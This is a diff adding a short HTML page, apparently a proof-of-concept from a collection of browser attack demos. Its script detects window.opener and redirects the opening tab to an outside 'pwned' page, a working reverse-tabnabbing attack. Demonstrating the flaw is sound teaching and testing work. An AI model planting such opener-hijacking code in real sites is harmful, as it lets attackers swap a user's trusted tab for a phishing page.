@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <center style="border: 10px ridge green;">
+        Tabnabbing attack vector!
+        <div id="outputDiv"></div>
+    </center>
+    <script>
+        if(window.opener){
+            document.getElementById("outputDiv").innerHTML += "Tab detected, nabbing!";
+            nabTab(window.opener);
+        } else {
+            document.getElementById("outputDiv").innerHTML += "No tab to nab :(";
+        }
+        function nabTab(windowToNab){
+            windowToNab.location.href = "https://balam314.github.io/attack-vectors/pwned.html";
+        }
+    </script>
+</body>
+</html>
